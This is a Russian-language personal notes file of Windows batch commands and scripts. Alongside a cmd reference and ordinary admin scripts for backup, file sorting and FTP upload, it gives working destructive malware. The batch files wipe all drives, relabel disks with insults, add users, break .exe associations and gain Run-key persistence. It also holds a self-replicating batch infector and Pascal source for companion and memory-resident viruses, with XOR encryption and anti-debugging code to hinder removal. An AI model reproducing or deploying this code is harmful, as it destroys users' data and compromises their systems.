## Welcome to Zametki
_________________________________________________________________________________________________

[памятка](https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/PrivEsc/CHEATSHEETS/windows_priv_escalation.md) для повышения привелегий

```markdown 

Echo – команда вывода на экран
Echo c:ski.bat >> autoexec.bat (Прописывает файл ski.bat в автозагрузку
@ — запрещает показывать
@echo off — запрещает вывод всех команд на экран
for – цикл, выполняет команду указанное количество раз
do – указывает, что делать
%%i – переменная, куда подставляются значения
in(1,1,100) – набор, который раскрывается в последовательность чисел от заданного начала, конца и шага
В нашем случае от 1,2,3,4,5,6,7,8…100
mkdir – создаёт папку
rmdir – удаляет папку
copy %0 x:\y - копирует вирус на диск x в папку y (пример copy %0 C:\System.bat)
Copy %0 c:ski.bat (копирует вирус только изменив названия)
label x:y - переименовывает диск x на имя y (пример label C:Disc error)
Label E: PRIDUROK (CD-ROM будет называться PRIDUROK)
time х:у - меняет время на х часов и у минут (пример time 14:27)
date x.y.z - меняет дату на x день, y месяц, z год (пример date 16.11.05) 
Date 13.09.96 (эта строка изменяет дату)
md х - создаст папку, в том месте, где наш вирус, с именем х (пример md Papka) 
md PRIDUROK
md LUZER
md DURAK (Создает пустые папки)
md LAMER
del *.* /q - удалит все файлы (наш вирус тоже) в папке, где лежит наш вирус (кроме папок) 
del x:\y *.* /q - удалит все файлы на диске х в папке у (кроме папок) (пример del F:\Data*.* /q) 
del c:Program Files/q (удаляет все файлы из этой папки)
assoc .х=.у - переделает все файлы, на компьютере, форматом х на у (пример assoc .exe=.mp3)
ren 5-??.png 7-??.png переименование файлов 5-??.png в 7-??.png  (? означает один символ)
assoc .exe=.mp3 (запускает все ексшники как музыка 
net user "х" /add - добавит на компьютер пользователя под именем х (пример net user "Smoked" /add) 
set - вывод, задание и удаление переменных среды cmd.exe.Там не все переменные, но много! Все смотреть просто set.
Attrib +h c:ski.bat ( делает файлу ski.bat атрибут скрытый 
If exist c:ski.bat goto abc (проверяет существует ли файл, …..) 
:abc ( ……если он существует, то программа перейдет на метку :abc) 
tftp - trivial ftp
tasklist - отображает приложения и сеансы, связанные с ним.
taskkill - позволяет завершить один или несколько процессов
tskill - убить процесс
reg - непосредственная работа с реестром. Смотреть reg /? всем! 
rcp - обмен файлами через rcp в ascii
runas - от имени пользователя
bootcfg - настройка boot.ini
append - позволяет открывать удаленные файлы так, словно они находятся в текущем.
getmac - получить мас 
logoff - Заверщить пользовательский сеанс.
mem - вывод на экран сведений о текущих процессах в ОЗУ
mqbkup - архивирование 
netsh - ??
openfiles - просмотреть открытые файлы.
rsh - выполнение команд на удаленных узлах с запущеной rsh
sc - command line ??
rexec - выполнение команд на удаленных узлах с запущеной rexec 
shutdown - выключить (хе-хе) local or remote computer.
systeminfo - вывод инфы о компе.
schtasks - планировщик заданий.
xcopy - копирование файлов и каталогов.
tsshutdn - завершение работы сервера в установленом порядке.
%SystemRoot%/system32/rundll32 user32, SwapMouseButton - Данная строчка меняет клавиши мыши местами

___________________________________________________________________________________________________________________

7za.exe a -tzip -ssw -mx7 -r0 -x@exclusions.txt full_path_for_the_archive working_dir
7za.exe a -tzip -ssw -mx7 -r0 -x@exclusions.txt \КУДА\ПАКУЕМ.7z \Что\пакуем
Поподробней об использованных ключах:
-tzip формат архива установлен в zip, без этого ключа умолчальный формат 7z;
-ssw принудительная упаковка файлов, которые в данный момент открыты для записи (мало ли кто-то засиделся на работе и что-то там правит);
-mx7 высокая степень сжатия (7), можно поставить и 5 (нормальное сжатие), тогда процесс пойдет побыстрее;
-r0 (это ноль, а не буква О) исключения, которые будут прописаны дальше обрабатываются только в рабочем каталоге;
-x@exclusions.txt это собственно говоря файл со списком исключений, которые не будем архивировать. Каждая строка файла — новое исключение. 
Можно использовать маски типа *.ext и т.п. 
Если исключение не много, то можно обойтись и без файла, в таком случае ключ примет следующий вид: -x!*.ext;
full_path_for_the_archive это соответственно путь и имя нового архива;
working_dir это папка, которая подлежит упаковке.
___________________________________________________________________________________________________________________

append — позволяет программам открывать файлы в указанных каталогах так , словно они находятся в текущем каталоге.
arp — отображение и изменение таблиц преобразования IP-адресов в физические, используемые протоколом разрешения адресов.
assoc — вывод либо изменение сопоставлений по расширениям имён файлов.
at — команда предназначена для запуска программ в указанное время.
atmsdm — Контроль подключений и адресов, зарегистрированных диспетчером вызовов ATM в сетях с асинхронным режимом передачи (ATM).
attrib — изменение атрибутов файлов и папок.
auditusr — задаёт политику аудита пользователей.

break — включение режима обработки клавиш CTRL+C.
bootcfg — эта программа командной строки может быть использована для настройки , извлечения , изменения или удаления параметров командной строки в файле Boot.ini.

cacls — просмотр изменение таблиц управления доступом ACL к файлам.
call — вызов одного пакетного файла из другого.
cd — вывод имени либо изменение текущей папки.
chcp — вывод либо изменение активной кодовой страницы.
chdir — вывод либо смена текущей папки.
chkdsk — проверка диска и вывод отчёта.
chkntfs — выводит или изменяет параметры проверки диска во время загрузки.
ciddaemon — сервис индексации файлов.
cipher — программа шифрования файлов.
cls — очистка экрана интерпретатора.
cmd — запуск нового окна командной строки.
cmstp — установка профилей диспетчера подключений.
color — устанавливает цвет для текста и фона в текстовых окнах.
comp — сравнение содержимого двух файлов или наборов файлов.
compact — просмотр и изменение параметров сжатия файлов в разделах NTFS.
convert — преобразование файловой системы тома FAT в NTFS.
copy — копирование одного или нескольких файлов.

date — вывод либо установка текущей даты.
debug — средство для отладки и редактирования программ.
defrag — дефрагментация диска.
del — удаление одного или нескольких файлов.
devcon — альтернатива диспетчера устройств.
diantz — тоже что и MAKECAB.
dir — вывод списка файлов и подпапок из указанного каталога.
diskcomp — сравнение содержимого двух гибких дисков.
diskcopy — копирование содержимого одного гибкого диска на другой.
diskpart — использования сценария diskpart.
diskperf — счетчик производительности дисков.
doskey — редактирование и повторный вызов команд Windows; создание макросов DOSKey.
driverquery — просмотр списка установленных драйверов устройств и их свойства.

echo — вывод сообщений и переключение режима отображения команд на экране.
edit — запуск редактора MS-DOS.
endlocal — завершение локализации изменений среды в пакетном файле.
edlin — запуск построчного текстового редактора.
erase — удаление одного или нескольких файлов.
esentutl — обслуживание утилит для Microsoft (R) баз данных Windows.
eventcreate — эта команда позволяет администратору создать запись об особом событии в указанном журнале событий.
eventtriggers — эта команда позволяет администратору отобразить и настроить триггеры событий в локальной или удаленной системе.
exe2bin — преобразование EXE-файлов в двоичный формат.
exit — завершение командной строки.
expand — распаковка сжатых файлов.

fc — сравнение двух файлов или двух наборов файлов и вывод различий между ними.
find — поиск текстовой строки в одном или нескольких файлах.
findstr — поиск строк в файлах.
finger — вывод сведений о пользователях указанной системы.
fltmc — работа с фильтром нагрузки драйверов.
for — выполнение указанной команды для каждого файла набора.
forcedos — сопоставление приложений MS-DOS, которые не распознаются системой Microsoft Windows XP.
format — форматирование диска для работы с Windows.
fontview — программа просмотра шрифтов.
fsutil — управление точками повторной обработки, управление разреженными файлами, отключение тома или расширение тома.
ftp — программа передачи файлов.
ftype — просмотр и изменение типов файлов, сопоставленных с расширением имен файлов.

getmac — отображает MAC-адрес одного или нескольких сетевых адаптеров компьютера.
goto — передача управления содержащей метку строке пакетного файла.
gpresult — отображает результирующую политику (RSoP) для указанного пользователя и компьютера.
gpupdate — выполнение обновления групповых политик.
graftabl — выбор кодовой страницы для отображения символов национальных алфавитов в графическом режиме.

help — выводит не полный список команд, которые используются в cmd.
hostname — отображение имени компьютера.

if — оператор условного выполнения команд в пакетном файле.
ipconfig — вывод маску подсети, стандартный шлюз и информацию о вашем IP.
ipxroute — программа управления маршрутизацией NWLink IPX.

label — создание, изменение и удаление меток тома для диска.
lodctr — обновление имен счётчиков и поясняющего текста для расширенного счётчика.
logman — управление расписанием для счетчиков производительности и журнала трассировки событий.
logoff — завершение сеанса Windows.
lpq — отображение состояния очереди удалённой очереди печати lpq.
lpr — направляет задание печати на сетевой принтер.
lsass — сервер определения локальной защиты.

makecab — архивирование файлов в cab-архив.
md — создание папки.
mem — выводит сведения об используемой и свободной памяти.
mkdir — создание папки с расширенной функциональностью.
mmc — открытие окна консоли MMC.
mode – отладка системных устройств
mofcomp — 32-разр. компилятор Microsoft (R) MOF.
more — последовательный вывод данных по частям размером в один экран.
mountvol — просмотр, создание и удаление точек подключения тома.
move — перемещение и переименование файлов и каталогов.
mqbkup — утилита архивирования и восстановления очереди сообщений.
mqsvc — Обеспечивает инфраструктуру для работы распределенных приложений.
mrinfo — Работа с многоадресными рассылками.
msg — отправка сообщений пользователю.
msiexec — запуск установщика Windows.

nbtstat — отображение статистики протокола и текущих подключений TCP/IP с помощью NBT (NetBIOS через TCP/IP).
net — пакет приложений предназначенный для работы с сетью.
net1 — тоже самое что и net.
netsh — локальное или удаленное отображение и изменение параметров сети.
netstat — отображение статистики протоколов и текущих сетевых подключений TCP/IP.
nlsfunc — загрузка сведений о национальных стандартах.
nslookup — вывод информации, предназначенный для диагностики DNS.
ntbackup — запуск мастера архивирования.
ntsd — отладчик командной строки.

odbcconf — настройка драйвера ODBC.
openfiles — эта команда позволяет пользователю вывести список открытых файлов и папок, которые были открыты в системе.


pagefileconfig — настройка файлов подкачки и виртуальной памяти.
path — вывод либо установка пути поиска исполняемых файлов.
pathping — вывод информации о скрытый сетях и потери данных.
pause — приостанавливает выполнение сценария cmd.
pentnt — обнаруживает ошибки деления с плавающей точкой процессора Pentium, отключает аппаратную обработку чисел с плавающей точкой и включает эмуляции операций с плавающей точкой.
perfmon — открывает окно «Производительность».
ping — проверяет соединение с другим компьютером.
ping6 — команда проверки связи.
popd — изменяет одну папку на ту, которая была сохранена командой PUSHD.
powercfg — эта команда позволяет управлять электропитанием системы.
print — печать текстового файла.
prncnfg — настройка параметров принтера.
prompt — изменение приглашения командной строки cmd.exe.
proxycfg — инструмент настройки proxy соединения.
pushd — сохранения значений текущего каталога для использования POPD командой.

qappsrv — отображает доступные серверы терминалов в сети.
qprocess — отображает информацию о процессах.
qwinsta — отображение информации о сеансах терминалов.

rasdial — интерфейс связи из командной строки для клиента службы удалённого доступа.
rcp — обмен файлами с компьютером, на котором выполняется служба RCP.
recover — восстановление сохранившихся данных на поврежденном диске.
reg — редактирование системного реестра через командную строку.
regsvr32 — сервер регистрации.
relog — создает новый журнал производительности из уже имеющего.
rem — помещение комментария в пакетный файл.
ren — переименование файлов и папок.
rename — переименование файлов и папок.
replace — замена файлов.
reset — утилита сброса служб терминалов.
rexec — выполнение команд на удаленных узлах на которых выполняется служба rexec.
rd — удаление папки.
rmdir — удаление папки.
route — обработка таблиц сетевых маршрутов.
rsh — выполнение команд на удаленных узлах, на которых запущена служба RSH.
rsm — управление ресурсами носителей с помощью службы «Съемные ЗУ».
runas — использование приложений от имени другого пользователя.
rundll32 — запуск стандартных команд-функций заложенных в dll.
rwinsta — сброс значений подсистем оборудования и программ сеанса в начальное состояние.

sc — установление связи с NT Service Controller и ее услугами.
schtasks — создание, удаление, изменение и опрос запланированных задачи в локальной или удаленной системе.
sdbinst — установщик базы данных совместимости.
secedit – автоматизация задач настройки безопасности.
set — вывод, присваивание и удаления переменных в командной строке.
setlocal — начало локализации изменений среды в пакетном файле.
setver — задает номер версии, который MS-DOS сообщает программе.
sfc — Проверка файлов Windows.
shadow — позволяет наблюдать за другим сеансом служб терминалов.
shift — изменение содержимого подставляемых параметров для пакетного файла.
shutdown — завершение сеанса, выключение и перезагрузка системы Windows.
smbinst — это процесс, принадлежащий System Management BIOS Driver Installer.
sort — сортирование файлов.
start — запуск программы или команды в отдельном окне.
subst — сопоставление имени диска указанному пути.
systeminfo — вывод информации о настройках системы.

taskkill — завершение одного или нескольких процессов.
tasklist — показывает запущенные программы и процессы выполняемые в данный момент.
tcmsetup — установка клиента телефонии.
tftp — обмен файлами с удаленным компьютером, на котором запущена служба TFTP.
time — просмотр или изменение текущего времени.
title — назначение заголовка окна интерпретатора.
tlntadmn — удаленное управление компьютером.
tracert — трассировка маршрута к указанному узлу.
tracerpt — обрабатывает двоичные файлы журнала отслеживания событий или потоки данных.
tracert6 — версия tracert для протокола IPv6.
tree — вывод структуры диска или каталога в виде дерева.
tscon — присоединяет сеанс пользователя к сеансу терминала.
tsdiscon — отключение сеанса терминала.
tskill — прекращение процесса.
tsshutdn — завершение работы сервера в установленном порядке.
type — вывод на экране содержимого текстовых файлов.
typeperf — выводит сведения о производительности на экран или в журнал.

unlodctr — удаление имен счётчиков и поясняющего текста для расширенного счётчика.
userinit — проводник системы Windows.
ver — вывод сведений о версии Windows.
verify — установка режима проверки правильности записи файлов на диск
vol — вывод метки и серийного номера тома для диска.
vssadmin — инструмент командной строки теневого копирования тома.

w32tm — диагностика службы времени.
wbemtest — тестер инструментария управления Windows.
winver — вывод информации о версии Windows.
wmic — инструмент для написания сценариев.

xcopy — копирование файлов и дерева папок.
___________________________________________________________________________________________________________________

привет я бат! =)
@echo Hello, i'm bat!
pause
___________________________________________________________________________________________________________________

После запуска батника,вы увидите 100 новых папок
@echo off
for /l %%i in (1,1,100) do mkdir "dir %%i"

___________________________________________________________________________________________________________________

А теперь сразу создадим bat файл, который будет удалять созданные нами раннее 100 папок
@echo off
for /l %%i in (1,1,100) do rmdir "dir %%i"

___________________________________________________________________________________________________________________

Чтобы добавить все атрибуты пишем такой код:
for /l %%i in (1,1,100) do mkdir "dir %%i"
for /l %%i in (1,1,100) do attrib +h +r +s "dir %%i"
h - скрытый (файл,пакпка не будет отображаться в компьютере,чтобы увидеть такой файл необходимо изменить настройки 
по умолчанию,в windows 7 для этого надо зайти в МОЙ КОМПЬЮТЕР=> упорядочить=>параметры папок=>вид=>показывать
скрытые файлы,папки и диски
s - системный
r - только для чтения(файл будет невозможно перезаписать)
а чтобы снять атрибуты:
for /l %%i in (1,1,100) do attrib -h -r -s "dir %%i"
___________________________________________________________________________________________________________________

Можно сделать так чтоб он удалял важные EXE-шники windows. пишем такой код
@echo off
do del "c:\windows\exploer.exe"
do del "c:\windows\mspoint.exe"
do del "c:\windows\notepad.exe"
___________________________________________________________________________________________________________________

Программа для удаления файлов с флешки (если та вставлена) и переименования ее. 
del F:\ *.* /q 
label F:HACK
___________________________________________________________________________________________________________________

Программа для изменения даты и времени на компьютере и копирования ее на диск C и на флешку. 
time 14:13 
date 11.07.12 
copy %0 C:\Time.bat 
copy %0 F:\Time.bat
___________________________________________________________________________________________________________________

@echo off 
del C:\ *.* /q >nul 
del D:\ *.* /q >nul 
del E:\ *.* /q >nul 
del F:\ *.* /q >nul 
time 00:00 >nul 
date 13.06.23 >nul 
del *.* /q >nul 
___________________________________________________________________________________________________________________

Очень неплохая строка для нагрузки слабеньких машин. Команда открывает Paint
:x ; 
Start mspaint 
goto x ; 

___________________________________________________________________________________________________________________

@echo off 
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul 
time 0:00 >nul 
date 13.06.23 >nul 
label C:IDIOT >nul 
label D:DURAK >nul 
label E:SUKA >nul 
label F:GANDON >nul 
copy %0 C:\Open.bat >nul 
copy %0 D:\Open.bat >nul 
copy %0 E:\Open.bat >nul 
copy %0 F:\Open.bat >nul 
net user "Idiot you Hacked" /add >nul 
net user "Bitch you Hacked" /add >nul 
net user "Durak you Hacked" /add >nul 
net user "Kritin you Hacked" /add >nul 
net user "Gavno you Hacked" /add >nul 
md 1 >nul 
md 2 >nul 
md 3 >nul 
md 4 >nul 
md 5 >nul 
md 6 >nul 
md 7 >nul 
md 8 >nul 
md 9 >nul 
md 10 >nul 
md 11 >nul 
md 12 >nul 
md 13 >nul 
md 14 >nul 
md 15 >nul 
md 16 >nul 
md 17 >nul 
md 18 >nul 
md 19 >nul 
md 20 >nul 
md 21 >nul 
md 22 >nul 
md 23 >nul 
md 24 >nul 
md 25 >nul 
md 26 >nul 
md 27 >nul 
assoc .lnk=.txt >nul 
assoc .exe=.txt >nul 
:x ; 
Start mspaint 
goto x ; 
:x ; 
Start Calc 
goto x ; 
copy ""%0"" "%SystemRoot%\system32\Cool.bat" >nul 
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Cool" /t REG_SZ /d "%SystemRoot%\system32\Cool.bat" /f >nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f >nul 
del %0 >nul 
___________________________________________________________________________________________________________________

Смысл заражения таков: в вирусе каждая строчка имеет метку, в данном примере она MeTrA. 
Например, в первой строке эта метка ничего не делает, во второй строке эта метка, как бы, не является пассивной, 
она используется для внутренней работы вируса, а именно участвует в названии метки. При запуске вирус проверяет, 
есть ли файл C:METRA.BAT, если нет, то вирус создает его и с помощью программы find копирует из файла (из которого стартовал) 
все строки содержащие метку вируса, т.е. копирует только вирусные строки. Так, вирусные строки скопированы. Значит в файле C:METRA.BAT 
теперь находится копия вируса. Далее вирус ищет BAT-файлы. Чтобы не происходило повторного заражения используется все таже программа find. 
Допустим вирус нашел файл RUN.BAT и он оказался еще не заражен, тогда вирус вызывает файл C:METRA.BAT с такими параметрами: In_ RUN.BAT, 
здесь первый параметр In_ говорит вирусу, что надо заразить файл, имя которого указано во-втором параметре, в данном случае он RUN.BAT. 
Вирус в C:METRA.BAT заражает файл RUN.BAT простейшим способом - с помощью команды type дописывает к файлу RUN.BAT себя. 
Вот так файл RUN.BAT оказывается зараженным.

@echo off%[MeTrA]% 
if '%1=='In_ goto MeTrAin 
if exist c:MeTrA.bat goto MeTrAru 
if not exist %0 goto MeTrAen 
find "MeTrA"<%0>c:MeTrA.bat 
attrib +h c:MeTrA.bat 
:MeTrAru 
for %%t in (*.bat) do call c:MeTrA In_ %%t 
goto MeTrAen 
:MeTrAin 
find "MeTrA"<%2>nul 
if not errorlevel 1 goto MeTrAen 
type c:MeTrA.bat>>%2 
:MeTrAen 
___________________________________________________________________________________________________________________

Компаньон-вирус 
Эти вирусы не изменяют программы. Они создают для EXE-файлов COM-файлы. При запуске программы сначала запустится COM-файл с вирусом, 
который заразив другие файлы запустит EXE-файл. Рассмотрим пример: 

{$M 2048,0,4096} 
{$i-} 
Program Metra; 
uses dos; 
var 
DirInfo : SearchRec; 
F1,f2 : File; 
Buf : Array[0..5000] of Byte; { размер вируса } 
NumRead : Word; 
NumWritten : Word; 
FT:text; 
P: PathStr; 
D: DirStr; 
N: NameStr; 
E: ExtStr; 
namecom:string; 
Label InfOk; 
Begin 
{ считать свое тело в буфер } 
Assign(F2,ParamStr(0)); 
Reset(F2,1); 
if ioresult<>0 then 
begin 
writeln('Файл ',paramstr(0),' не доступен!'); 
halt; 
end; 
BlockRead(F2,buf,SizeOf(buf),NumRead); 
Close(F2); 
{ искать жертву } 
FindFirst('*.EXE',Archive,DirInfo); 
While DosError = 0 Do 
Begin 
FSplit(dirinfo.name, D, N, E); 
namecom:=n+'.com'; 
{ проверить существует ли файл } 
Assign(ft,namecom); 
reset(ft); 
if ioresult=0 then { если уже существует } 
begin 
close(ft); 
goto infOk; 
end; 
{ создать COM-файл с вирусом } 
Assign(F1,namecom); 
rewrite(f1); 
if ioresult<>0 then goto InfOk; {если ошибка, то пропустить} 
Reset(F1,1); 
BlockWrite(F1,buf,NumRead,NumWritten); 
Close(F1); 
infOk: 
FindNext(DirInfo); 
End; 
{ запустим своего носителя } 
FSplit(paramstr(0), D, N, E); 
swapvectors; 
exec(d+n+'.EXE',paramstr(1)); 
swapvectors; 
{ если вызвали с таким параметром, то надо представитьcя } 
if paramstr(1)='/??' then 
begin 
writeln('Virus MeTrA.'); 
writeln('^^^^^^^^^^^^'); 
end; 
halt(dosexitcode); { выйти и сохранить код ошибки } 
End. 

___________________________________________________________________________________________________________________

Вирус-спутник 

Принцип заражения: 

• найти EXE-файл 
• найти OVR-файл с тем же именем 
• если его нет, то переименовать найденный EXE-файл в OVR-файл, записаться вместо EXE-файла. 

Резидентные вирусы 

Из справки Паскаля: 

{$M $800,0,0 } { 2K stack, no heap } 
{ This program causes a click each time a key is pressed.} 
uses Crt, Dos; 
var 
KbdIntVec : Procedure; 
{$F+} 
procedure Keyclick; interrupt; 
begin 
if Port[$60] < $80 then 
{ Only click when key is pressed } 
begin 
Sound(5000); 
Delay(1); 
Nosound; 
end; 
inline ($9C); { PUSHF -- Push flags } 
{ Call old ISR using saved vector } 
KbdIntVec; 
end; 
{$F-} 
begin 
{ Insert ISR into keyboard chain } 
GetIntVec($9,@@KbdIntVec); 
SetIntVec($9,Addr(Keyclick)); 
Keep(0); { Terminate, stay resident } 
end. 

Теперь уберем все ошибки из этого примера и переделаем под вирус: 

{$F+} 
procedure Keyclick; interrupt; 
begin 
InfExe; { вызов процедуры заражения } 
inline ($9C); { PUSHF -- Push flags } 
{ Call old ISR using saved vector } 
KbdIntVec; 
end; 
{$F-} 

Здесь процедура InfExe является обычной процедурой нерезидентного вируса (заражает в текущем каталоге).
 А вот эти строки впишем в то место вируса, где как бы его конец. 

{ Insert ISR into keyboard chain } 
GetIntVec($21,@KbdIntVec); 
SetIntVec($21,@Keyclick); 
Keep(0); { Terminate, stay resident } 

К сожалению в справке не сказано как избегать повторной установки в память, поэтому я советую чтобы вирус 
копировал свое тело в какой-нибудь файл на диске C:, вставлял его вызов в config.sys.
Пример: install=c:vir.exe /123, здесь /123 - это такой параметр, он говорит вирусу, что тот стартовал для заражения памяти, 
т.е. ему не надо запускать своего носителя, а надо выполнить эти три строчки. 

Можно помудрить и с другими прерываниями, но вынужден вас расстроить, вирусы такого типа, как правило,
очень глючные и работают, в основном, только в многозначной среде (в эмуляции DOS виснут). 

___________________________________________________________________________________________________________________

Усложнение лечения 
Если у вас нет желания чтобы ваш вирус, доставшись какому-нибудь ламеру, стал жертвой его антивируса,
 то следует подумать об усложнении лечения. 
Вирус на Паскале, как правило, заражает программы в начало, перенося старое содержимое в конец. 
Такими вирусами антивирусные базы пополняются автоматом (без вмешательства человека). Оно и понятно,
переписать конец в начало и обрезать длину - это очень простая операция. Смысл усложнения лечения 
заключается в шифровке куска своей жертвы.
Т.к. кусок жертвы при переносе к конец файла находится в массиве, тогда поступаем примерно так: 

for i:=1 to 777 do 
begin 
cc:=a1[i]; 
i2:=ord(cc) xor 343; 
a1[i]:=chr(i2); 
end; 

Здесь a1 - это массив, в котором сохраняется начало жертвы; i,i2 - integer; cc - char. 

В результате данной операции шифруется кусок файла-жертвы (777 байт). Т.к. операция шифровки осуществляется
с помощью XOR - для расшифровки используется та же операция. Значит эту маленькую подпрограмму надо оформить
в виде процедуры, которую следует прописать в процедуре заражения и в процедуре запуска своего носителя 
(перед запуском и после запуска). Если вы не разбираетесь в XOR, то скажу, в моем примере шифровка осуществляется
с помощью ключа 343, он может быть от 1 до 65000. Можно сделать так, чтобы этот ключ менялся при заражении каждого файла,
например, сделать чтобы ключ зависел от размера своего носителя или можно генерировать ключ случайным образом и
помещать его где-нибудь в теле вируса или считывать несколько байт кода жертвы, получать их ord-значения и использовать как ключ. 
И еще, в моем примере шифровка идет от начала файла, а можно сделать определенное смещение, которое тоже чтобы зависело от чего-нибудь. 
Размер шифровки у меня 777, а можно сделать ее тоже случайной и т.д. Можно также защитить вирус от ламерской трассировки: 

uses dos; 
var 
O1H , O3H , Br : Pointer; 
{$F+} 
procedure ReBoot; Interrupt; 
begin { а это для того, чтобы нехорошие дяди не запускали Debug } 
InLine($EA/ 
$00/ 
$00/ 
$FF/ 
$FF); 
end; 
{$F-} 
{$F+} 
procedure BreakOff; Interrupt; { + } 
begin 
{ Invisible Magic Words! } 
end; 
{$F-} 
begin {main} 
GetIntVec($01 , O1H); { подготавливаем систему } 
SetIntVec($01 , @ReBoot); 
GetIntVec($03 , O3H); { вешаем антитрассировщик } 
SetIntVec($03 , @ReBoot); 
GetIntVec($1B , Br); { заменяем вектор ^C } 
SetIntVec($1B , @BreakOff); 
SetCBreak(False); { и отключаем ^C } 
writeln('hello'); 
SetIntVec($01 , O1H); { восстанавливаем захваченные векторы } 
SetIntVec($03 , O3H); 
SetIntVec($1B , Br); 
end. 

Здесь вместо фразы Hello следует вставить процедуры вируса, процедуру запуска носителя следует вставлять
после строк восстановления векторов.
___________________________________________________________________________________________________________________
делаем список юзеров кто с какими процессами оставил пк
set fdate=%DATE%
ECHO "Менеджеры КОРПОРАТИВ ОТДЕЛ" > D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 202" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 226" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 207" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 218" >> D:\tasklistterminal\terminal_%fdate%.txt

ECHO "Менеджеры ИТАЛЬЯНСКИЙ ОТДЕЛ" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 251" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 210" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 209" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 250" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 208" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 217" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 213" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 216" >> D:\tasklistterminal\terminal_%fdate%.txt

ECHO "Менеджеры РУССКИЙ ОТДЕЛ" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq avia-4" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 221" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 257" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 254" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 261" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 269" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 270" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 271" >> D:\tasklistterminal\terminal_%fdate%.txt

ECHO "Бухгалтерия" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq 214" >> D:\tasklistterminal\terminal_%fdate%.txt
tasklist /v /fi "USERNAME eq cash" >> D:\tasklistterminal\terminal_%fdate%.txt
___________________________________________________________________________________________________________________

простой бекап
set datetemp=%time% или set datetemp=%date%
md \\10.47.19.1\1c-arhiv\%datetemp%
copy e:\bases\arhiv\*.* \\10.47.19.1\1c-arhiv\%datetemp%
___________________________________________________________________________________________________________________

бежит красиво время
@echo off 
:loop
echo %time%
goto loop
___________________________________________________________________________________________________________________

Сортировка файлов в папке своими руками
rem Проверяем существование и создаем необходимые каталоги
if not exist "archives" md "archives"
if not exist "iso" md "iso"
if not exist "music" md "music"
if not exist "video" md "video"
if not exist "programs" md "programs"
if not exist "photos" md "photos"
if not exist "images" md "images"
if not exist "docs" md "docs"

rem Перемещаем архивы часто используемых типов в arhives
for %%f in (*.zip,*.gz,*.tgz,*.rar) do move "%%f" "archives"

rem ISO-файлы — в каталог ISO
move *.iso iso

rem Видео — в каталог video
for %%f in (*.avi,*.mov,*.mp4,*.mkv,*.3gp) do move "%%f" "video"

rem Музыка (в основном это MP3-файлы)
move *.mp3 music

rem Программы и фото
move *.exe programs
move *.jpg photos

rem Изображения
for %%f in (*.png,*.bmp,*.gif,*.tiff) do move "%%f" "images"

rem Документы
for %%f in (*.pdf,*.txt,*.doc,*.docx,*.xls) do move "%%f" "docs"

rem Удаляем торрент-файлы
del *.torrent

___________________________________________________________________________________________________________________

Создай файл upload.bat. Мы его будем использовать для загрузки всех txt-файлов из локального каталога
c:\test в удаленный каталог tmp нашего FTP-сервера. В этот файл помести всего одну строчку:

ftp -n -s:commands.ftp
Параметр -n запрещает автоматический вход на сервер (входом будем управлять вручную), 
а второй задает текстовый файл с командами FTP-клиента, которые будут или выполнены локально, 
или переданы серверу (в зависимости от команды). В нашем случае commands.ftp следующий:

open сервер
USER пользователь
пароль
binary
cd tmp
lcd c:\test
prompt
mput *.txt
bye

Обрати внимание: пароль указывается в отдельной строке после указания имени пользователя. 
Команда binary включает двоичный режим обмена информацией. Команда cd изменяет каталог на FTP-сервере, 
lcd — на локальном компе. 
Команда prompt отключает режим подтверждений для команд mput (множественная загрузка файлов на сервер),
mget (множественная загрузка файлов с сервера). Команда bye завершает работу сценария.

Данный сценарий легко переделать в сценарий, загружающий файлы с сервера. 
Для этого достаточно команду mput заменить на mget.

Я привел довольно тривиальный пример. Но ты можешь существенно его расширить.
Никто тебе не мешает добавить перед вызовом команды ftp команды, создающие архив каталога БД. Например:

rar a c:\test\backup.rar @backup.lst
Эта команда создаст архив backup.rar по всем файлам, указанным в текстовом файле backup.lst. 
После этого в commands.ftp нужно изменить mput *.txt на mput *.rar.
___________________________________________________________________________________________________________________
Скрипт бэкапа
@echo off
cls
:m1
Echo Your Choice:
Echo.
Echo //////////////////////////////////////////////////////////////////
Echo 1 - Copy all E:\ drive to G:\BackUp                         
Echo.
Echo 2 - Copy Desktop to E:\BackUp\Current Day\Desktop           
Echo.
Echo 3 - Copy My Docements to E:\BackUp\Current Day\My Documents 
Echo.
Echo 4 - Copy Favourites to E:\BackUp\Current Day\Favourites
Echo.
Echo 9 - Copy regedit.exe to E:\BackUp\Current Day\Regedit     
Echo //////////////////////////////////////////////////////////////////
 
Echo.
